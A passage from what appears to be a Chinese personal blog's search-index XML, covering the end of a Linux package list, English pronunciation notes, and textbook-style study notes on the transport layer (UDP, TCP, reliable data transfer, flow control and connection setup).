class="line">vulkan-radeon 20.0.6-2</span><br><span class="line">wacom-utility 1.21-6</span><br><span class="line">wallpapers-2018 1.2-1</span><br><span class="line">wallpapers-juhraya 1.1-2</span><br><span class="line">wget 1.20.3-3</span><br><span class="line"><span class="built_in">which</span> 2.21-5</span><br><span class="line">whois 5.5.6-1</span><br><span class="line">wireshark-qt 3.2.3-1</span><br><span class="line">wpa_supplicant 2:2.9-7</span><br><span class="line">wps-office-cn 11.1.0.9505-1</span><br><span class="line">wps-office-mui-zh-cn 11.1.0.9505-1</span><br><span class="line">xclip 0.13-2</span><br><span class="line">xdg-desktop-portal 1.7.2-1</span><br><span class="line">xdg-desktop-portal-kde 5.18.5-1</span><br><span class="line">xdg-su 1.2.3-1</span><br><span class="line">xdg-user-dirs 0.17-2</span><br><span class="line">xdg-utils 1.1.3+19+g9816ebb-1</span><br><span class="line">xf86-input-elographics 1.4.2-1</span><br><span class="line">xf86-input-evdev 2.10.6-1</span><br><span class="line">xf86-input-libinput 0.29.0-2</span><br><span class="line">xf86-input-void 1.4.1-4</span><br><span class="line">xf86-video-amdgpu 19.1.0-1</span><br><span class="line">xf86-video-ati 1:19.1.0-1</span><br><span class="line">xf86-video-intel 1:2.99.917+906+g846b53da-1</span><br><span class="line">xf86-video-nouveau 1.0.16-1</span><br><span class="line">xfsprogs 5.6.0-2</span><br><span class="line">xmind 3.7.9+8update9-1</span><br><span class="line">xorg-server 1.20.8-2</span><br><span class="line">xorg-twm 1.0.10-2</span><br><span class="line">xorg-xinit 1.4.1-1</span><br><span class="line">xorg-xkill 1.0.5-2</span><br><span class="line">yakuake 20.04.0-1</span><br><span class="line">yaourt 1.9-1</span><br><span class="line">yay 9.4.7-2</span><br><span class="line">youdao-dict 1.1.0-2</span><br><span class="line">zeal 1:0.6.1-1</span><br><span class="line">zsh 5.8-1</span><br></pre></td></tr></table></figure><h2 id="ventoy"><a href="#ventoy" class="headerlink" title="ventoy"></a>ventoy</h2><p>是一个镜像工具，可以将u盘的iso文件直接读取使用</p><h2 id="mindmaster，xmind"><a href="#mindmaster，xmind" class="headerlink" title="mindmaster，xmind"></a>mindmaster，xmind</h2><p>制作脑图的工具</p><h2 id="Packet-tracer用户登录闪退问题"><a href="#Packet-tracer用户登录闪退问题" class="headerlink" title="Packet tracer用户登录闪退问题"></a>Packet tracer用户登录闪退问题</h2><p>安装<code>ttf-ms-fonts</code>解决</p>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 美化 </tag>
            
            <tag> 系统优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8-14口语笔记</title>
      <link href="/English/O/8-14.html"/>
      <url>/English/O/8-14.html</url>
      
        <content type="html"><![CDATA[<p> 造就完了</p><span id="more"></span><h2 id="连续发音分析"><a href="#连续发音分析" class="headerlink" title="连续发音分析"></a>连续发音分析</h2><h3 id="to"><a href="#to" class="headerlink" title="to"></a>to</h3><p>一般发/t/</p><p>在元音之间发闪音</p><ul><li>way to go.干的漂亮</li><li>I can’t go to the dance with my borther.</li><li>go to  bed.</li></ul><h3 id="to-do-you-know-go"><a href="#to-do-you-know-go" class="headerlink" title="to,do,you,know,go"></a>to,do,you,know,go</h3><p>他们后面有w的音，如果后面接元音会连读</p><ul><li><p>Do it.</p></li><li><p>What’s goi<u>n</u>g <u>on</u>?</p></li><li><p>go(w) on.(做w的口型连过去)</p></li><li><p>You’ll go(w) off.</p></li><li><p>Talk to(w) <del>h</del>im.</p></li><li><p>see you(w) again.</p></li><li><p>yello<u>w a</u>pple.</p></li></ul><h3 id="we-are"><a href="#we-are" class="headerlink" title="we are"></a>we are</h3><p>音似were</p><ul><li><p>We’re here.</p></li><li><p>While we’re a<strong>t i</strong><del>t</del>.既然我们那样做了</p></li><li><p>we are no<del>t</del>.</p></li></ul><h3 id="hundred"><a href="#hundred" class="headerlink" title="hundred"></a>hundred</h3><p>两个音：hun<del>dr</del>e<del>d</del>,hundre<u>d</u></p><ul><li>hundred bucks.</li><li>5 <del>h</del>undred bucks</li><li>eig<u>ht h</u>undred bucks.</li></ul><h3 id="T-you"><a href="#T-you" class="headerlink" title="T+you"></a>T+you</h3><p>强调可以读you，念快了读&#679;u</p><ul><li>look at you</li></ul><h3 id="D-you"><a href="#D-you" class="headerlink" title="D+you"></a>D+you</h3><p>you读jiu</p><ul><li>I don’t need you.</li></ul><h3 id="see-it"><a href="#see-it" class="headerlink" title="see it"></a>see it</h3><p>e+i连读发yer</p><ul><li>se<u>e i</u>t.</li></ul><h2 id="发音规律"><a href="#发音规律" class="headerlink" title="发音规律"></a>发音规律</h2><h3 id="L"><a href="#L" class="headerlink" title="L"></a>L</h3><p>首部/le/</p><ul><li>light</li><li>lemon</li><li>leg</li><li>lion</li><li>leapt</li><li>luscious美味的</li></ul><p>末尾/e/</p><ul><li>you’ll go off.</li></ul><p>当l结尾后面接元音时，又会发/le/</p><ul><li>tel<u>ling</u></li><li>I wil<u>l a</u>llways love you.</li><li>sto<u>le</u> it.</li><li>Cause I’m al<u>l a</u>bou<u>t t</u>he learnin.</li><li>I’ll tell <del>h</del>er we’re leaving.</li></ul><h3 id="R"><a href="#R" class="headerlink" title="R"></a>R</h3><p>首部时，嘴做圆形</p><ul><li>Rockin</li><li>Robot</li></ul><p>做结尾，和l差不多</p><h3 id="t-d-p-k-g-b-f-v-m-n"><a href="#t-d-p-k-g-b-f-v-m-n" class="headerlink" title="t,d,p,k,g,b,f,v,m,n"></a>t,d,p,k,g,b,f,v,m,n</h3><p>这几个<strong>音</strong>相遇要省略前一个</p><ul><li><p>Is i<u>t t</u>oo soon.</p></li><li><p>ni<u>ce su</u>it.(发音一样)</p></li><li><p>Wha<u>t d</u>o you want.</p></li><li><p>Can’t you tal<del>k</del> to(w) <del>h</del>er</p></li><li><p>So what do i do?</p></li><li><p>How do I talk to her.</p></li><li><p>Say something to her.</p></li><li><p>I can’<del>t</del> ge<del>t</del> mommy an<del>d</del> daddy bac<del>k</del> together.</p></li><li><p>ba<del>d</del> dog.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 口语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 口语 </tag>
            
            <tag> 美式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.传输层</title>
      <link href="/Networking/Top-Down-Note/3.%E4%BC%A0%E8%BE%93%E5%B1%82.html"/>
      <url>/Networking/Top-Down-Note/3.%E4%BC%A0%E8%BE%93%E5%B1%82.html</url>
      
        <content type="html"><![CDATA[<p>本章详细的介绍了运输层的TCP和UDP协议</p><span id="more"></span><h2 id="3-1-概述运输层服务"><a href="#3-1-概述运输层服务" class="headerlink" title="3.1-概述运输层服务"></a>3.1-概述运输层服务</h2><p>运输层对不同主机之间的应用程序提供了<strong>逻辑通信（logic communication）</strong>，类似将应用层连在了一起。</p><p>运输层协议实在端系统中实现的，运输层通过应用层接收到的报文转换为运输层分组，该分组被称为<strong>报文段（segment）</strong>，然后交给网络层被封装成网络层分组（数据报） 向目的地发送。</p><h3 id="3-1-1-运输层和网络层的关系"><a href="#3-1-1-运输层和网络层的关系" class="headerlink" title="3.1.1-运输层和网络层的关系"></a>3.1.1-运输层和网络层的关系</h3><p>网络层为主机之间提供逻辑通信，运输层为主机的应用程序提供逻辑通信。</p><h3 id="3-1-2-运输层概述"><a href="#3-1-2-运输层概述" class="headerlink" title="3.1.2-运输层概述"></a>3.1.2-运输层概述</h3><p>提供了两个协议：</p><ul><li>UDP（用户数据报协议）：提供不可靠的，无连接的服务</li><li>TCP（传输控制协议）：提供可靠的，面向连接的服务</li></ul><p>当我们设计应用程序时，必须选择其中一个协议（才能生成套接字）。</p><p>为了理解这两个协议，先说一下网络层的<strong>IP</strong>，IP的服务<strong>是尽力而为交付服务（best-effort delivery service）</strong>，它不保证报文段的交付、顺序交付及完整性，所以被称为<strong>不可靠服务（unreliable service）</strong>，每个主机都有一个IP地址。</p><p>而UDP和TCP则是将两个端系统的IP对话服务扩展到进程之间的对话。</p><h2 id="3-2多路复用和多路分解"><a href="#3-2多路复用和多路分解" class="headerlink" title="3.2多路复用和多路分解"></a>3.2多路复用和多路分解</h2><p> 当运输层报文到达运输层时，运输层检查这些字段，得到套接字（唯一标识的），然后将数据传给这个套接字，这些工作被称为<strong>多路分解（demultiplexing）</strong>。</p><p>在源主机收集数据块封装首部信息，生成报文段传给网络层，这些工作被称为<strong>多路复用（multipexing）</strong>。</p><p>所以多路复用要求：</p><ol><li>套接字有唯一标识符</li><li>有特殊字段来指示对话的套接字（如源端口和目标端口）</li></ol><blockquote><p>注意0-1023端口是比较特殊的，如80给了HTTP，25给了SMTP…详细请看<a href="https://www.rfc-editor.org/rfc/rfc1700.html">RFC1700</a></p></blockquote><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/transport-layer.png" style="zoom: 33%;" /><h3 id="1-无连接的多路复用和多路分解"><a href="#1-无连接的多路复用和多路分解" class="headerlink" title="1.无连接的多路复用和多路分解"></a>1.无连接的多路复用和多路分解</h3><p>使用python创建一个UDP套接字来分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clientSocket = socket(socket.AF_INET,socket.SOCK_DFRAM)</span><br></pre></td></tr></table></figure><p>这种方式创建的socket在运输层会自动被分配一个1024-65535的端口，并且该端口未被主机使用，也可以使用bind()方法指定端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clientSocket.bind((<span class="string">&#x27;&#x27;</span>,<span class="number">9001</span>))</span><br></pre></td></tr></table></figure><p>如果是设计知名协议（http、smtp）的服务端，那就要使用这个协议指定的端口。</p><p><strong>复用和分解</strong></p><p>假设A主机有一个进程额UDP端口是10000，发送给B主机UDP端口为20000的进程，那么主机A的运输层首先创建一个运输层报文，包括<strong>数据，源端口，目标端口</strong>，传递给网络层，网络层封装到IP数据报中，向B主机发送。</p><p>到达B时，B的运输层检查目标端口，然后把数据交给该端口对应的套接字（定向分解）</p><p><strong>注意事项</strong></p><p>UDP套接字是一个二元组，包含了一个IP和端口，比如上面bind方法里面的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;&#x27;</span>,<span class="number">9001</span>)<span class="comment"># 第一个参数是IP，当为空时代表本机</span></span><br></pre></td></tr></table></figure><p>源端口的作用，是服务端返回数据时用的</p><h3 id="2-面向连接的复用和分解"><a href="#2-面向连接的复用和分解" class="headerlink" title="2.面向连接的复用和分解"></a>2.面向连接的复用和分解</h3><p>TCP套接字使用了四元组(src_IP,src_prot,dst_IP,dst_port)标识，目标主机会使用四个值分解到相应的套接字。</p><p>使用python代码演示一下TCP</p><ul><li>TCP客户端创建套接字并连接上服务端</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clientSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">clientSocket.connect((serverName,serverPort))</span><br></pre></td></tr></table></figure><ul><li>当服务端接收到请求后，定位服务器进程，然后建立一个新的套接字</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connectionSocket, addr = serverSocket.accept()</span><br></pre></td></tr></table></figure><ul><li>此时服务端会注意连接请求报文的4个值，如果后续到达的报文段4个值与连接的4个值相等，则将数据分解到新建立的套接字上。这就算建立连接完成了。</li><li>前面说的持续HTTP就是使用同一个套接字传输数据，非持续就是不断产生新的套接字，这是比较浪费服务端性能的</li></ul><blockquote><p><strong>端口的安全性</strong></p><p>端口对于破坏者来说相当于突破口，如果该端口上的应用程序有缺陷，则破坏者就能在攻击的主机上执行任意代码，导致主机被攻陷。</p></blockquote><h2 id="3-3-UDP"><a href="#3-3-UDP" class="headerlink" title="3.3-UDP"></a>3.3-UDP</h2><p>UDP被称为是无连接的，因为发送方与接收方的运输层实体之间没有握手。</p><p>DNS通常就使用了UDP，因为TCP需要握手，如果使用TCP的话，DNS查询会慢很多，而UDP不需任何准备就可以传输数据</p><p>TCP是可靠的传输协议，那我们什么时候使用UDP呢。下面是比较适合使用UDP的几点</p><ul><li><strong>希望随时发送数据，可以容忍一点数据丢失</strong>，TCP有一个拥塞控制机制，当链路拥挤时会阻塞运输层的发送</li><li><strong>不想建立连接</strong>，连接也是有往返时延的，如DNS使用UDP</li><li><strong>分组首部占用小</strong>，UDP报文端有8字节的首部，TCP有20字节</li></ul><p>因为UDP没有拥塞处理，所以会有较高的丢包率</p><h3 id="3-3-1-UDP报文段结构"><a href="#3-3-1-UDP报文段结构" class="headerlink" title="3.3.1-UDP报文段结构"></a>3.3.1-UDP报文段结构</h3><p>应用层数据占用UDP的数据字段。UDP首部有<strong>4个字段</strong>，每个占<strong>2字节</strong>；除了源端口和目的端口，还有Length和校验和，Length表示报文段的字节数（首部+数据）</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/udp-segment.png" style="zoom:33%;" />                                                                                                                         <h3 id="3-3-2-UDP校验和"><a href="#3-3-2-UDP校验和" class="headerlink" title="3.3.2-UDP校验和"></a>3.3.2-UDP校验和</h3><p>为了确保数据在发送过程中不会出错，发送方的UDP会对报文中的所有16bit字节进行相加（溢出部分不管）再取反，将结果放在校验和字段，接收方将所有16bit全相加，如果结果不是<code>1111 1111 1111 1111</code>则代表出了差错</p><blockquote><p>更多计算细节参考<a href="https://segmentfault.com/a/1190000008543293">https://segmentfault.com/a/1190000008543293</a></p></blockquote><p>其实数据链路层也有差错控制，为什么UDP还需要呢？主要是因为不能保证源和目的之间所有链路都有差错控制，其次就是当报文传递到内存中也可能出现差错。</p><blockquote><p>UDP也是可以进行可靠传输的，但这需要应用层开发人员建立一些机制，并大量调试</p></blockquote><h2 id="3-4-可靠数据传输原理"><a href="#3-4-可靠数据传输原理" class="headerlink" title="3.4-可靠数据传输原理"></a>3.4-可靠数据传输原理</h2><p>这章使用术语‘分组’，只考虑单向传输</p><h3 id="3-4-1-从0构造一个可靠数据传输协议"><a href="#3-4-1-从0构造一个可靠数据传输协议" class="headerlink" title="3.4.1-从0构造一个可靠数据传输协议"></a>3.4.1-从0构造一个可靠数据传输协议</h3><p>书中从研究最简单的协议进行深入得到一个无错的、可靠的协议</p><h4 id="可靠传输rdt1-0"><a href="#可靠传输rdt1-0" class="headerlink" title="可靠传输rdt1.0"></a>可靠传输rdt1.0</h4><p>在这个协议中，设定底层信道是完全可靠的。</p><p>下图是发送和接收方的<strong>有限状态机</strong>FSM（Finite-State Machine），FSM简单来说就是描述某一时刻的状态和转换状态字符</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/rdt1.0.png" alt="rdt1.0"></p><p>蓝色箭头代表状态的改变，这里的FSM只有一个状态。横线上方是事件，下方是动作。</p><p>假设发送速率和接收速率一样，又有完全可靠的信道，所以不用担心差错问题，和发送速率问题。</p><h4 id="rdt2-0"><a href="#rdt2-0" class="headerlink" title="rdt2.0"></a>rdt2.0</h4><p>这个协议考虑到了信道的差错。</p><p>类比人类，如果小明对小红说话，而小红没听清，于是叫小明再说一遍。</p><p>在rdt2.0里使用了<strong>自动重传请求ARQ（Automatic Repeat reQuest）</strong></p><ul><li>差错检测</li><li>接收方反馈：确认（ACK）和否定确认（NAK）</li><li>重传</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/rdt2.0.png" alt=""></p><p>发送端比1.0增加了一个状态–等待接收方回答，由于发送端发送数据后就进入了等待状态，所以这种协议叫<strong>停等（stop and wait）</strong>协议。</p><p>而接收方就准备接收和回答。</p><p>这个模型的缺点就是当回答出现差错时，发送方就不知道接收方是否正确的接收到了数据</p><p>解放方法（书上还有重述和纠错，但介绍模型只有下面两个）</p><ol><li><p>添加冗余ACK，出错就重传当前分组，缺点是不知道分组是最新的还是重传的</p></li><li><p>传输协议在数据分组中添加一个新字段，然后对数据分组编号，将<strong>序号</strong>放在这个字段。所以接收方会检查序号来选择是否重传。</p><p>对于停等协议，这个字段采用1bit记录。接收方根据最近的分组序号是否相同可以知道重传的分组，根据不同可以知道新分组。</p></li></ol><h4 id="rdt2-1"><a href="#rdt2-1" class="headerlink" title="rdt2.1"></a>rdt2.1</h4><p>从上面的方法改进rdt2.0，这里假设信道不会丢失分组，而ACK和NAK也不用回答序号，因为我们知道是响应最近的分组</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/rdt2.1.png" alt="rdt2.1"></p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/rdt2.1-receiver.png" alt="rdt2.1-receiver"></p><p><em>Λ代表无事件或动作</em></p><p>发送方依旧通过NAK和ACK接收回答，但如果接收到同一分组的两个ACK，就说明后面的分组没有收到。</p><h4 id="rdt2-2"><a href="#rdt2-2" class="headerlink" title="rdt2.2"></a>rdt2.2</h4><p>展示了一个有<strong>比特</strong>差错信道上实现的无NAK的可靠传输协议</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/rdt2.2-sender.png" alt=""></p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/rdt2.2-receiver.png" alt="rdt2.2-sender"  /><p>接收方与2.1的区别就是回答增加了分组序号，发送方需要检查这个序号来选择重传和发送下一个分组。</p><h4 id="rdt3-0"><a href="#rdt3-0" class="headerlink" title="rdt3.0"></a>rdt3.0</h4><p>前面考虑的都是bit差错，而网络上丢包屡见不鲜（比如你如果在大陆ping我的网址，绝对丢包，因为我的网站部署在github上，大陆在github的访问速度一言难尽），如果丢包，需要解决两个问题：1.如何检测丢包。2.如何处理丢包。第二个问题rdt2.2已经解决了，为了解决第一个问题，需要增加一个协议。</p><p>而判定一个数据包丢失的因素，最好的就是时间超时，发送方可以每发送数据分组时启动一个计时器，在规定时间过期后就可以重传。</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/rdt3.0-sender.png" alt=""></p><p>上面就是rdt3.0的发送方，运行大致步骤：</p><ol><li>发送分组0，启动计时器</li><li>接收回应，如果分组出了差错，等待超时</li><li>超时后，重传，启动新的计时器</li><li>分组正确被接收，停止计时器</li><li>当ACK因超时到达时，do nothing</li><li>发送分组1….</li></ol><p>下图就是当ACK超时到达时的运行情况</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/timeout.png" alt=""></p><p>因为序号在0与1之间转换，所以rdt3.0也叫<strong>比特交替协议（alternating-bit protocol）</strong></p><h3 id="3-4-2-流水线可靠数据传输协议"><a href="#3-4-2-流水线可靠数据传输协议" class="headerlink" title="3.4.2-流水线可靠数据传输协议"></a>3.4.2-流水线可靠数据传输协议</h3><p>停等协议有着很大的性能缺点，在1Gbps的链路，当往返传播时延（RTT）比较大时（几十毫秒），信道利用率只有万分之几（发送方传输时间与接收时间+RTT的比值），也就是说即便是1Gbps的链路，也只能达到kbps级别的吞吐量。这充分体现了网络协议可以限制硬件能力。</p><p>所以，有了<strong>流水线</strong>协议，它的特点就是一次发送多个分组，分组利用率就提高多少倍。</p><p>为了保证流水线协议的可靠性，必须保证以下几点</p><ul><li>增加序号范围</li><li>增加缓存</li><li>处理分组丢失、损坏、延时过大等问题：如回退N，选择重传。</li></ul><h3 id="3-4-3-回退N步"><a href="#3-4-3-回退N步" class="headerlink" title="3.4.3-回退N步"></a>3.4.3-回退N步</h3><p>GBN（Go-Back-N）允许发送多个分组，N代表未确认的分组不能超过N.</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/GBN.png" alt=""></p><p><code>base</code>代表已经发送等待回应的最初序号，<code>nextseqnum</code>代表下一个准备发送的序号，整体随着协议的运行有点像一个滑动的窗口，所有N被称为窗口长度，GBN也叫滑动窗口协议。</p><p>分组的序号是在首部的固定字段中，范围与所占bit有关。</p><p>下图就是GBN的发送方和接收方的FSM，包括了一些编程语言的特性–变量。</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/GBN-2.png" alt="GBN-2"></p><p>发送方</p><ul><li>当窗口未满时，允许上层调用<code>rdt_send()</code>，发送n（将窗口填满）个分组并启动一个计时器</li><li>接收ACK，因为接收方对ACK的要求，发送方接收到n序号的ACK，则代表n以前的分组已经顺利交付</li><li>超时事件，如果某个分组丢失或者超时，就会重传没有被确认的分组</li></ul><p>接收方</p><ul><li>如果是按序号到达的，则发送这个序号的ACK，并交付给上层</li><li>如果不是，则丢弃，并发送最近序号的ACK</li></ul><p>我总结了GBN的特点</p><ul><li>如果不是按序到达，则后面的分组会被接收方丢弃，由发送方重传</li><li>如果接收方前面所有的ACK丢失，哪怕最后只有一个ACK，发送方也会知道分组完好到达接收方</li></ul><h3 id="3-4-4-选择重传SR"><a href="#3-4-4-选择重传SR" class="headerlink" title="3.4.4-选择重传SR"></a>3.4.4-选择重传SR</h3><p>GBN的缺点很明显，也是一个性能问题，当中间某个分组丢失，则后面的所有分组也会被丢弃。</p><p>选择重传就是将不按顺序到达的分组缓存并发送ACK，等前面分组齐了就交付。</p><p><strong>发送方</strong></p><ul><li><strong>从上层接收数据</strong>，如果序号在窗口内，则打包数据发送，否则不进行传输</li><li><strong>超时</strong>，现在每个分组都有一个逻辑计时器，某个超时就发送某个分组</li><li><strong>接收ACK</strong>，若ACK序号在窗口内，则标记该序号为已接受，如果==base，则窗口向前滑动</li></ul><p><strong>接收方</strong></p><ul><li>接收分组序号在窗口内，若前面有空的序号，则该分组缓存，并发送ACK；若该序号与后面的序号连续，则交付这串连续的分组，发送ACK，并滑动窗口</li><li>接收到以前确认的分组（不在窗口内），发送ACK</li><li>否则忽略掉</li></ul><blockquote><p>注意：SR的窗口长度必须&lt;=序号空间（包括0），否则会因为不同步的问题难以区分新旧分组</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table><thead><tr><th>机制</th><th>用途</th></tr></thead><tbody><tr><td>校验和</td><td>检测分组的bit错误</td></tr><tr><td>定时器</td><td>检测超时、丢包</td></tr><tr><td>序号</td><td>接收方判定重传的是副本还是新的</td></tr><tr><td>ACK</td><td>接收方告诉发送方”收到”</td></tr><tr><td>NAK</td><td>和上面相反</td></tr><tr><td>窗口，流水线</td><td>窗口利用率低，流水线要好得多</td></tr></tbody></table><h2 id="3-5-TCP"><a href="#3-5-TCP" class="headerlink" title="3.5-TCP"></a>3.5-TCP</h2><p>TCP连接是带有状态的，初次连接会初始化这些状态变量。</p><p>TCP是<strong>全双工服务</strong>（full-duplex service），指的是点对点的交换数据，即一对主机。</p><p>建立一条TCP连接：客户先发送一个特殊的TCP报文段，服务接收后用另一条特殊的TCP报文段回应，客户发送第3段报文（含有上层数据），这种过程称为<strong>三次握手</strong>。</p><p>建立连接后双方可以互相发送数据了，数据向从套接字出发后，就交由TCP控制，TCP会先将数据放入缓存，时机一到就发送。从缓存取出封装发送的报文段受<strong>最大报文段长度</strong>MSS（Maximum Segment Size）影响，MSS由<strong>最大传输单元（链路层）</strong>MTU（Maximum Transmission Unit）设置。一般MTU都是1500字节，MSS都是1460字节，因为IP+TCP首部有40字节。</p><blockquote><p>MSS指的是报文段里的数据长度，不包括TCP首部</p><p>官方TCP<a href="https://media.pearsoncmg.com/aw/ecs_kurose_compnetwork_7/cw/content/interactiveanimations/flow-control/index.html">缓存示例</a></p></blockquote><h3 id="TCP的报文段结构"><a href="#TCP的报文段结构" class="headerlink" title="TCP的报文段结构"></a>TCP的报文段结构</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/TCP-segment.png" alt="2"> </p><p>从上到下，左到右的简述</p><ul><li>与UDP一样，开头是<strong>源端口和目的端口</strong>，每个16bit</li><li>第二和第三行是<strong>序号字段（Seq）</strong>和<strong>确认（ACK）字段</strong>，这是实现可靠数据传输的重要部分</li><li>4bit的代表<strong>首部长度字段</strong>，单位是32bit，可以代表0-60byte(15x32/8)。通常TCP是20字节，可选字段会影响这个长度</li><li>4bit未使用</li><li>8bit的<strong>标志字段</strong>，ACK标识上面的ACK字段是否有效，RST、SYN、FIN表示连接、建立、拆除；PSH代表接收方需要马上<strong>上交数据</strong>，URG代表存在紧急数据。</li><li>16bit的<strong>接收窗口字段</strong></li></ul><h4 id="序号和确认"><a href="#序号和确认" class="headerlink" title="序号和确认"></a>序号和确认</h4><p>将数据流拆分成报文段，序号有利于将这些报文段正确重组成数据，即使他们无序到达。接收方发送的ACK里面是它期望的下一个报文段。（序号使用字节流编号）</p><p>假设1号到达，3号到达，而2号还在路上，此时1号期望2号，而3号也一样期望2号。这叫<strong>累计确认（cumulative ACK）</strong>。</p><p>对于提前到达的3号，RFC不提供规则，处理方法由开发者决定，要么丢弃，要么缓存。</p><blockquote><p>实际上，防止旧连接的报文段与现有报文段冲突，初始序号都是随机的</p></blockquote><p>我使用一段对话来帮助理解：</p><p><em>A表示客户，随机序号10，B表示服务端，随机序号20</em></p><ol><li>A:’你好，我是10号（Seq），携带5字节的数据，我期待20号（ACK）’</li><li>B:’收到，我是20号，携带100字节，期望15（10+5）号’</li><li>A:’收到，我是15号，我期望120号的数据….’</li><li>……..</li></ol><p>接下来是一些关于估计往返时间（RTT）和设置重传时间间隔，有点看不懂，跳了</p><h3 id="TCP可靠传输"><a href="#TCP可靠传输" class="headerlink" title="TCP可靠传输"></a>TCP可靠传输</h3><p>为每个没有ACK的报文段使用计时器，不容易管理。采用的简单模型如下</p><p><em>发送方三个事件</em></p><ul><li><strong>接收上层数据</strong>：创建TCP报文段，如果当前无计时器则启动一个计时器，传递给IP封装发送</li><li><strong>超时</strong>：发现计时器超时，重启，并发送超时的最小的序号段</li><li><strong>接收ACK</strong>：将ACK序号与当前序号对比，如果大于，则当前序号=ACK序号；当前还有未确认的报文段，重启计时器</li></ul><blockquote><p>因为采用<strong>累计确认</strong>，所以ACK序号前面的字节都代表完好无损的到达了</p></blockquote><p>需要注意的一点就是在传输数据时，如果第一个事件和第三个事件都没发生，超时每次重启的时间间隔都会是以前的<strong>两倍</strong>，这是为了缓解网络拥塞</p><p>这种重传机制也会增大时延，接受方也采用了一定的策略来解决这种不必要的时延</p><table><thead><tr><th>事件</th><th>接受方动作</th></tr></thead><tbody><tr><td>当期望序号按序到达，且前面的序号都已确认</td><td>延时发送ACK，通常是500ms</td></tr><tr><td>当期望序号按序到达，而前面还在延时发送ACK</td><td>立即发送ACK，确认了两个序号</td></tr><tr><td>当报文段失序到达</td><td>发送最小确认序号的下一个期望序号ACK</td></tr><tr><td>填充失序的中间序号到达</td><td>若是最小序号所期望的，则立即发送ACK</td></tr></tbody></table><p>而发送方接受ACK的动作增加了一项</p><ul><li>连续接受到3个一样的ACK，则立刻重传丢失的报文段</li></ul><h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><p>缓存毕竟有限，如果发送方不顾接受方是否愿意，强塞怎么办，那必然会导致接收方缓存溢出，而TCP报文段的<strong>接收窗口（receive window）字段</strong>可以控制发送方的发送速度，这就是TCP的流量控制服务。</p><blockquote><p>请注意流量控制和拥塞控制之间的区别</p></blockquote><p><em>TCP接收方的变量关系</em></p><ul><li>最后一个从缓存读取的字节编号-最后接收进缓存的字节编号&lt;=接收缓存</li></ul><p>接收方需要发送的接收窗口大小就是上面两个编号的差。</p><p><em>TCP发送方的变量关系</em></p><ul><li>最后发送的字节编号-最后一次接收的ACK编号&lt;=接收窗口</li></ul><p>注意：当接收方回应接收窗口为0时，发送方接收后还需要回应一字节的报文被接收方确认，当接收方缓存有空余时，确认报文的接收窗口不为0。</p><h3 id="TCP连接管理"><a href="#TCP连接管理" class="headerlink" title="TCP连接管理"></a>TCP连接管理</h3><p><strong><em>建立TCP连接：三次握手（three-way handshake）</em></strong></p><ol><li>客户端建立一个特殊的报文，将<strong>SYN同步序列编号（Synchronize Sequence Numbers）</strong>标志位设置为1，随机取得初始序号client_isn，然后发送</li><li>服务器收到后，<strong>响应SYN</strong>对该TCP分配缓存和变量，然后设置个SYN为1，ACK为client_isn+1，并取得<strong>随机序列号server_isn</strong>，然后发送SYNACK（如果一分钟之后没有回应，则关闭连接）</li><li>客户收到后，分配缓存和变量，然后设置SYN为0，ACK为server_isn+1，代表连接成功，然后发送带客户数据的报文段给服务器</li></ol><p><strong><em>断开连接</em></strong></p><ol><li>客户将发送一个将FIN标志为1的报文段，进入FIN_WAIT_1</li><li>服务器收到，然后回应ACK，客户收到进入FIN_WAIT_2</li><li>过一会，服务器发送FIN为1的报文段</li><li>客户端回应ACK，并进入TIME_WAIT状态，等待30s释放端口等资源</li></ol><p>客户端经典的TCP状态图</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/tcp-client-stat.png" alt="tcp-client-stat"></p><blockquote><p>连接第三步后处于ESTABLISHED状态，可以发送有效数据</p></blockquote><p>服务端经典TCP状态图</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/tcp-server-stat.png" 